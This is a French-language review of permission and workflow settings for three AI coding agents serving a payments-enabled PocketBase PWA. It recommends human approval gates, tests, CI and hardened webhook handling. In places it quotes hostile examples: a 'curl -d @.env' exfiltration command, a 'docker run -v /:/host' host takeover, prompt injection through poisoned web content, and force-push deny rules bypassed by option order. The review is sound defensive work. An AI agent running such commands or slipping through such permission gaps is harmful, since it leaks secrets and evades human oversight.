# Recommandations — agents `lead-dev`, `ops-quality`, `integrations`

**En bref :** l'ensemble est bien structuré (rôles clairs, délégation, living doc). Les risques principaux sont les mêmes dans les trois fichiers :

- **Permissions plus larges que les règles écrites.** `git`, `docker`, `curl`, `coolify` et `npx` passent sans validation.
- **Aucun agent n'écrit les tests.** `lead-dev` ne teste pas, et `ops-quality` exécute sans écrire.
- **Pas de jalons humains** avant les actions irréversibles : merge `main`, déploiement prod, appels réels aux API de paiement.
- **Plusieurs outils et syntaxes à vérifier**, qui ne correspondent peut-être pas à la stack réelle (PocketBase).

Légende : 🔴 critique · 🟠 important · 🟢 amélioration. « À vérifier » signifie que le point n'a pas pu être confirmé sans la documentation ou l'environnement.

---

## 1. Transverse (les trois fichiers)

### 🔴 Qui écrit les tests ?

- Aujourd'hui, personne.
- Recommandation : `lead-dev` écrit les tests unitaires et d'intégration de ses fonctionnalités, `integrations` ceux de ses intégrations, et `ops-quality` les exécute et juge la couverture.
- La DoD des specs doit inclure « tests écrits et verts ».

### 🔴 Jalons de validation humaine

Lister explicitement les actions qui exigent un « oui » humain, quel que soit l'agent :

- merge vers `main`, tag et release ;
- déploiement staging et prod ;
- migration de schéma sur une base non locale ;
- tout appel à une API de paiement hors sandbox ;
- suppression de données ou de ressources (branches distantes, releases, buckets).

### 🔴 Résolution des motifs de permission OpenCode

- Plusieurs règles reposent sur une exception (`"git *": allow` puis `"git push --force*": deny`). Elles ne fonctionnent que si OpenCode évalue les motifs dans le bon ordre. À vérifier dans la doc OpenCode : dernière règle qui matche, ou règle la plus spécifique ?
- Dans tous les cas, doubler avec une **protection de branche `main` sur GitHub** (PR obligatoire, pas de force push). C'est la seule protection indépendante des agents.

### 🟠 Une CI GitHub Actions minimale

- Lint, typecheck, tests et build sur chaque PR.
- La qualité ne dépend alors plus de la bonne exécution d'un agent, et `ops-quality` s'appuie sur un résultat reproductible.

### 🟠 Contrat `AGENTS.md`

- Les trois agents dépendent de `AGENTS.md` (PORT, DEV_CMD, KILL_CMD, mapping des fichiers, variables d'env), mais sa structure n'est définie nulle part.
- Recommandation : un gabarit fixe avec des sections obligatoires. Sinon chaque agent l'interprète différemment.

### 🟠 Format de passage de relais entre agents

- Définir le format des échanges : spec concernée, fichiers modifiés, commandes lancées, résultat, points bloquants.
- Limiter les allers-retours `lead-dev` ↔ `ops-quality`, par exemple 3 itérations maximum puis escalade humaine, pour éviter les boucles coûteuses.

### 🟠 Skills référencées mais non fournies

- `shared-eco-tokens`, `pwa-validation`, `api-paiements`, `api-best-practices` : existence et contenu non vérifiés.
- Si l'une manque, l'agent improvisera. Vérifier qu'elles sont bien dans `~/.config/opencode/skills/`.

### 🟠 Choix PocketBase vs Turso

- Le choix doit être tranché, car il se répercute partout : `psql` dans `integrations`, `pb_hooks`, format des migrations, backups.
- Tant qu'il reste ouvert, les agents embarquent des outils contradictoires.

### 🟢 Section « Intégration de nouvelles skills » dupliquée

- Elle est copiée dans les trois fichiers : des tokens consommés à chaque session, ce qui contredit l'objectif `shared-eco-tokens`.
- La garder dans un seul endroit (README de la config ou `AGENTS.md` global).

---

## 2. `lead-dev`

### 🔴 Permissions

- `"git *": allow` : cet agent n'est pas censé gérer le cycle Git, qui revient à `ops-quality`. Le limiter à la lecture (`git status*`, `git diff*`, `git log*`, `git branch*`) et éventuellement `git add*` / `git commit*` sur `testing`. Tout le reste en `ask`.
- `"git push "` (avec espace final) : motif probablement inopérant pour `git push origin testing`. À vérifier ; de toute façon, `git push*` en `ask`.
- `"node *"`, `"npx *"`, `"bun *"` en `allow` : exécution de code arbitraire, qui contourne le `"*": ask`. Combiné à `webfetch: allow` et `external_directory: allow`, un contenu web piégé (injection de prompt) peut faire exécuter des commandes. Pragmatique : garder `npm run *` / `pnpm run *` en `allow`, passer `npx`, `node` et `bun x` en `ask`.
- `task: "": deny` : probablement `"*": deny` dont les astérisques ont été perdus. À vérifier dans le fichier source.
- `external_directory: allow` : passer en `ask`, sauf chemins explicites.

### 🔴 Tests

- Ajouter dans « Périmètre » : écrit les tests de chaque fonctionnalité et lance lint, typecheck et tests rapides avant de déléguer à `ops-quality`.
- Aujourd'hui, la boucle de feedback n'existe qu'en fin de cycle.

### 🟠 Stack par défaut trop ouverte

- « PocketBase ou Turso » : ce ne sont pas des alternatives équivalentes. PocketBase est un backend complet avec auth et règles d'accès ; Turso n'est qu'une base, qui impose d'écrire un backend. Fixer un défaut, par exemple « PocketBase sauf justification dans BLUEPRINT ».
- Nommer le framework front, TypeScript strict et la librairie de validation.

### 🟠 Conventions de code absentes

- Ajouter une courte section, ou un lien vers `docs/CONVENTIONS.md` : structure des dossiers, emplacement de la logique métier, gestion des erreurs, nommage.
- Rester léger, sans Clean Architecture complète pour une PWA MVP.

### 🟠 Sécurité côté conception

- **Règles d'accès PocketBase (API rules)** : les définir dans chaque spec et les documenter dans `DATABASE.md`. C'est la source de fuite n°1 sur ce type de backend.
- **Autorisations** : chaque spec doit préciser qui peut lire, créer, modifier et supprimer quoi, pour prévenir les IDOR.
- **Données personnelles** : si la cible est la Côte d'Ivoire (supposé d'après Jèko/CinetPay), mentionner la loi n°2013-450 et l'ARTCI dans le cadrage, avec minimisation des données collectées. Faire valider les obligations exactes par une personne compétente.

### 🟠 PWA mobile-first

- Ajouter dans BLUEPRINT une stratégie offline (ressources en cache, comportement hors ligne, synchronisation) et un budget de performance (poids JS, cibles réseau lent).
- La stratégie de mise à jour du service worker (éviter les versions figées chez l'utilisateur) doit être une décision explicite.

### 🟠 Jalons humains dans le workflow

- Stop et validation après CADRAGE, après le choix de stack, après le schéma de données, et avant toute spec touchant au paiement.

### 🟢 Phases 0–10

- Seules 8 étapes sont décrites. Aligner la liste sur le document de référence, ou pointer vers lui.
- Le périmètre est très large (naming, SEO, design, code). Ça fonctionne, mais surveiller la dilution du contexte sur de longues sessions.

---

## 3. `ops-quality`

### 🔴 Permissions dangereuses

- `"docker *": allow` : équivalent root sur la machine (`docker run -v /:/host`). Passer en `ask`, ou limiter à `docker compose ps*` / `docker compose logs*`.
- `"coolify *": allow` : déploiement sans validation humaine. Passer en `ask`.
- `"gh *": allow` : inclut `gh repo delete`, `gh release delete` et `gh secret set`. Limiter à `gh pr *`, `gh run *` et `gh release create*`, le reste en `ask`.
- `"kill *": allow` : risque de tuer des processus hors projet. Préférer `KILL_CMD` défini dans `AGENTS.md`, le reste en `ask`.
- **Deny sur le force push incomplets** : `"git push --force*"` ne bloque pas `git push origin main --force` (option en fin de commande). Soit `git push*` en `ask`, soit des motifs couvrant l'option n'importe où (syntaxe à vérifier). La protection de branche GitHub reste la vraie garantie.
- `"git *": allow` inclut aussi `git reset --hard`, `git clean -fdx` et `git branch -D`. Les passer en `ask`.
- `edit` / `write` `"*": ask` : l'agent « ne corrige jamais le code », mais la permission lui permet de le faire avec validation. Passer `"*": deny` pour aligner permission et règle.

### 🔴 Identifiants affichés dans le tableau récapitulatif

- « Récupérer dans `.env` » est ambigu : un `.env` local peut contenir des secrets de prod.
- Restreindre explicitement à un fichier dédié au dev (`.env.local`, ou section dev de `RUNBOOK.md`) et interdire la lecture de `.env.production` / `.env.prod`.

### 🔴 Merge `testing` → `main` sans revue

- Passer par une PR (`gh pr create`) avec CI verte et validation humaine, plutôt qu'un merge local.

### 🟠 Ordre du workflow

- Mettre la détection de secrets en premier : peu coûteuse et bloquante, inutile de lancer Lighthouse si une clé est commitée.
- Remplacer le `grep` maison par un outil dédié (gitleaks ou équivalent), qui couvre aussi l'historique Git.
- Ajouter un audit des dépendances (`npm audit` ou équivalent) et vérifier que le lockfile est commité.

### 🟠 Lighthouse : cibles et commande à revoir

- `http://<projet>.test` alors que le reste parle de HTTPS local : incohérent, et une PWA exige HTTPS pour le service worker (sauf localhost).
- Lancer l'audit sur le build de production servi localement, pas sur le serveur de dev, sinon les scores ne sont pas représentatifs.
- **Catégorie « PWA installable »** : retirée de Lighthouse dans les versions récentes (v12, à confirmer). À vérifier selon la version installée ; sinon utiliser la checklist `pwa-validation` ou le panneau Application de Chrome DevTools.
- **INP < 200 ms** : non mesurable en audit de navigation Lighthouse (métrique terrain). Utiliser TBT comme proxy en labo, ou retirer l'INP des critères bloquants.
- Le certificat de l'autorité locale Caddy doit être approuvé par le Chrome lancé par Lighthouse, sinon l'audit échoue.

### 🟠 Outils à vérifier

- `npx impeccable detect` : existence et fiabilité du paquet non confirmées. Un `npx` sur un paquet non vérifié est un risque supply chain. Vérifier le paquet sur npm (auteur, activité, téléchargements) et l'épingler en devDependency plutôt qu'en `npx` à la volée.
- `playwright-cli` : à vérifier ; l'outil officiel s'invoque habituellement via `npx playwright`. S'assurer que la commande autorisée correspond à ce qui est installé.

### 🟠 E2E paiement

- Préciser : sandbox uniquement, jamais de clés de prod dans l'environnement de test.

### 🟠 Déploiement et données

- **Sauvegardes** : « quotidiennes R2 » ne suffit pas. Ajouter un **test de restauration documenté et périodique** dans le RUNBOOK. Pour SQLite / PocketBase, la sauvegarde doit être cohérente (mécanisme de backup PocketBase ou snapshot à chaud adapté), pas une copie brute du fichier en cours d'écriture.
- **Migrations** : ordre explicite dans le RUNBOOK (backup → migration → déploiement → vérification) et procédure de rollback.
- **Monitoring** : préciser au minimum un check de disponibilité et un suivi des erreurs applicatives.

### 🟢 Cohérence des outils

- « Via MCP github_* de préférence à gh » : aucune permission MCP n'est définie. Soit l'ajouter, soit retirer la mention.
- Le verdict ✅/⚠️/⛔ est une bonne pratique. Ajouter un format de rapport fixe (tableau des étapes, statut, preuve) pour que `lead-dev` puisse le traiter mécaniquement.

---

## 4. `integrations`

### 🔴 Permissions sur l'argent et les données

- `"curl *": allow` : double risque. Exfiltration (`curl -d @.env https://…`) via injection de prompt, et appels réels aux API Jèko/CinetPay (paiement, remboursement) si des clés de prod sont présentes. Passer en `ask`.
- `"psql *": allow` : incohérent avec PocketBase/Turso (SQLite/libSQL), et dangereux si une variable pointe vers une base distante. Retirer, ou remplacer par l'outil réellement utilisé, en `ask`.
- `"pb *"` : commande non standard. À vérifier (alias local ?), sinon retirer.
- `edit` / `write` `allow` sur `**/pb_hooks/**` et `**/hooks/**` : c'est du code serveur qui manipule l'argent, écrit sans validation. Au minimum, imposer une revue humaine en PR sur tout ce qui touche au paiement.

### 🔴 Webhooks de paiement : règles à compléter

Les règles actuelles (HMAC, idempotence, 2xx) sont justes mais incomplètes :

- Vérifier la signature sur le **corps brut** de la requête, avec une **comparaison à temps constant**.
- **Ne jamais créditer sur la seule foi du webhook** : re-vérifier le statut de la transaction via l'API du fournisseur, et contrôler montant, devise et référence de commande.
- **Idempotence garantie en base** : contrainte d'unicité sur l'identifiant de transaction du fournisseur, pas seulement une vérification applicative (conditions de course).
- **Protection anti-rejeu** : si Jèko fournit un horodatage signé, rejeter les événements trop anciens. À vérifier dans la doc Jèko.
- **Réponse 2xx** : seulement après persistance durable de l'événement ; traitement métier ensuite. Signature invalide → 4xx. Événement inconnu → 2xx et log.
- **Machine à états explicite** du paiement (en attente, réussi, échoué, remboursé), transitions interdites refusées.

### 🔴 Réconciliation absente

- Ajouter un job périodique qui compare les transactions du fournisseur à la base et signale les écarts.
- Sans lui, un webhook perdu = un client qui a payé sans être crédité.

### 🔴 Retry et idempotence sur les appels sortants

- « Header `Idempotency-Key` pour les écritures » suppose que Jèko et CinetPay le supportent. À vérifier dans leur documentation, ne pas le présumer.
- Un timeout sur une création de paiement n'est **pas** un échec : ne pas relancer aveuglément (risque de double débit). Vérifier le statut avant tout retry.

### 🟠 Bascule Jèko → CinetPay

- Définir quand on bascule : panne détectée, choix utilisateur, paiement par carte.
- Jamais de bascule automatique au milieu d'une transaction, sinon risque de double paiement.

### 🟠 Montants

- Stocker en entiers dans l'unité de la devise (le XOF n'a pas de décimales), avec la devise explicite.

### 🟠 Dunning

- « Échec de prélèvement » suppose un débit récurrent automatique. En Mobile Money, le paiement nécessite généralement une confirmation de l'utilisateur. À vérifier auprès de Jèko.
- Si le prélèvement automatique n'existe pas, le dunning = relances + lien de paiement, pas des retries de débit.

### 🟠 Factures PDF

- **Faisabilité technique** : les `pb_hooks` s'exécutent dans un moteur JavaScript embarqué, pas dans Node.js. Les librairies npm de génération PDF ou Handlebars ne sont donc pas utilisables directement. À vérifier selon la version de PocketBase ; prévoir sinon un petit service séparé ou un workflow n8n.
- **Conformité** : numérotation séquentielle sans trou, factures immuables. Les obligations fiscales ivoiriennes (mentions obligatoires, éventuelle facture normalisée) sont à valider avec un comptable.

### 🟠 Emails

- SPF, DKIM et DMARC configurés sur le domaine d'envoi, sinon délivrabilité mauvaise.
- Liens magiques et OTP : courte durée de validité, usage unique, limitation de débit.
- Réinitialisation de mot de passe : même réponse que le compte existe ou non (pas d'énumération).

### 🟠 R2 et URLs présignées

- Clé d'objet générée côté serveur (jamais fournie par le client), bucket privé, contrôle d'autorisation avant d'émettre l'URL, expiration courte.
- **Taille et type de fichier** : une URL présignée PUT ne limite pas la taille par défaut. Vérifier ce que R2 permet (Content-Length / Content-Type signés) et valider après upload.
- **Compression AVIF/WebP** : préciser où elle a lieu (client, service dédié). Probablement pas dans les `pb_hooks`, pour la même raison que les PDF.

### 🟠 Seed et migrations

- Garde-fou explicite : le seed refuse de s'exécuter hors environnement local ou staging.
- Migrations versionnées dans Git, testées sur une copie de staging, backup systématique avant application.

### 🟠 Tests obligatoires

Tests à écrire pour chaque intégration :

- signature valide, invalide et absente ;
- rejeu du même événement ;
- montant incohérent ;
- transition d'état interdite ;
- fournisseur indisponible.

### 🟠 Logs et données personnelles

- Les numéros de téléphone Mobile Money sont des données personnelles : les masquer dans les logs, au même titre que les secrets.

### 🟢 Clarifications

- `{file:...}` est une syntaxe de configuration OpenCode, pas un mécanisme de secrets applicatifs. Distinguer clairement « secrets de l'agent » et « secrets de l'application » (variables d'env Coolify).
- Le champ `extras` des erreurs ne doit jamais contenir de détails internes (stack, requête SQL, réponse brute du fournisseur).
- **n8n** : un composant d'infra supplémentaire à héberger, sécuriser et sauvegarder. Le garder hors MVP sauf besoin avéré, et dans tous les cas authentifier ses webhooks entrants.

---

## 5. Ordre de mise en œuvre suggéré

1. Activer la protection de branche `main` sur GitHub (10 minutes, protection indépendante des agents).
2. Durcir les permissions à risque : `curl`, `docker`, `coolify`, `gh`, `git`, `npx`/`node`, `psql`.
3. Attribuer l'écriture des tests et ajouter les jalons humains dans les trois fichiers.
4. Compléter les règles webhooks et ajouter la réconciliation dans `integrations`.
5. Mettre en place la CI minimale et le gabarit `AGENTS.md`.
6. Vérifier les points marqués « à vérifier » : outils (`impeccable`, `playwright-cli`, `pb`), capacités Jèko (idempotence, horodatage, prélèvement récurrent), runtime des `pb_hooks`, version de Lighthouse.
7. Trancher PocketBase vs Turso et nettoyer les outils incohérents.
